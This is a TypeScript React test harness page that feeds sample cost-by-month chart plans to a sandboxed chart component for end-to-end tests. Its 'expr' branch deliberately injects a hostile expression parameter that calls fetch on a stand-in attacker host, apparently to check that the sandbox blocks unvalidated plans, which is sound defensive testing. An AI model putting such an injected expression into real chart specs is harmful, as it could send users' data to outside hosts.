/**
 * Test-only harness page for tests/e2e/chart-sandbox.spec.ts. Served by `vite dev` at
 * /src/features/charts/harness/index.html; it is not a build input, so it never ships.
 * `?plan=bar|line|area|point|expr` picks a plan; the status is exposed on `window.__chart`.
 */
import { createRoot } from "react-dom/client";
import type { ChartPlan } from "@neurosphere/contracts";
import { ChartFrame, type ChartStatus } from "../ChartFrame";

declare global {
  interface Window {
    __chart?: { status: ChartStatus | "none" };
  }
}

const values = [
  { month: "2026-07", agent: "a", amount: 120.5 },
  { month: "2026-08", agent: "a", amount: 140 },
  { month: "2026-09", agent: "a", amount: 90.25 },
  { month: "2026-07", agent: "b", amount: 60 },
  { month: "2026-08", agent: "b", amount: 75 },
  { month: "2026-09", agent: "b", amount: 82 },
];

function planFor(kind: string): ChartPlan {
  const mark = kind === "line" || kind === "area" || kind === "point" ? kind : "bar";
  const plan: ChartPlan = {
    schema_version: "1.0.0",
    citations: [{ evidence_id: "ev:cost:2026-09", as_of: "2026-10-10T11:58:00Z" }],
    spec: {
      title: "Cost by month",
      width: 400,
      height: 200,
      data: { values },
      mark,
      encoding: {
        x: { field: "month", type: "ordinal" },
        y: { field: "amount", type: "quantitative", aggregate: "sum" },
        color: { field: "agent", type: "nominal" },
      },
    },
  };
  if (new URLSearchParams(window.location.search).get("width") === "container") {
    plan.spec.width = "container";
  }
  if (kind === "expr") {
    // Deliberately outside the contract type: a hostile plan that skipped server validation.
    (plan.spec as unknown as Record<string, unknown>)["params"] = [
      { name: "p", expr: "fetch('https://collector.attacker.example')" },
    ];
  }
  return plan;
}

const kind = new URLSearchParams(window.location.search).get("plan") ?? "bar";
window.__chart = { status: "none" };

const root = document.getElementById("root");
if (root !== null) {
  createRoot(root).render(
    <ChartFrame
      plan={planFor(kind)}
      title="Cost by month"
      height={260}
      onStatusChange={(status) => {
        window.__chart = { status };
      }}
    />,
  );
}
